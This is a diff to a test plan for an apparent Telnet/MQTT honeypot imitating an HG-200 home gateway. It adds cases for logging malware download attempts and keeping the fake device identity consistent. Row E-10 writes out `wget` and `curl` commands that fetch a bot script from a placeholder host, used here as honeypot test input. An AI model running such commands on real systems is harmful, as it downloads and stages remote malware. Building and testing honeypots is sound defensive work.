@@ -27,6 +27,8 @@ Use a temporary local CSV path or an in-memory store for repeatable runs.
 | E-07 | Resource limits | More clients than global/per-IP limits | Excess clients rejected; accepted sessions remain usable |
 | E-08 | Persistence | Complete synthetic session | All metadata, login attempts, commands, and events readable from JSON blob |
 | E-09 | Isolation | Two concurrent Telnet sessions create/read the same virtual path | State exists only in the creating session |
+| E-10 | Payload retrieval attempt | `wget -O /tmp/bot http://example.invalid/bot.sh`; `curl https://example.invalid/bot.sh` | Plausible network error; original command/response and structured `payload.download_attempt`; `Executed=false`, `Downloaded=false`; no outbound request or payload file |
+| E-11 | Coherent gateway identity | Telnet banner, `hostname`, `uname -a`, device files, `netstat`; MQTT `home/gateway/#` | Matching HG-200 model, firmware 1.4.2 and hostname; MQTT listener visible only when enabled |
 
 ## Measurements
 
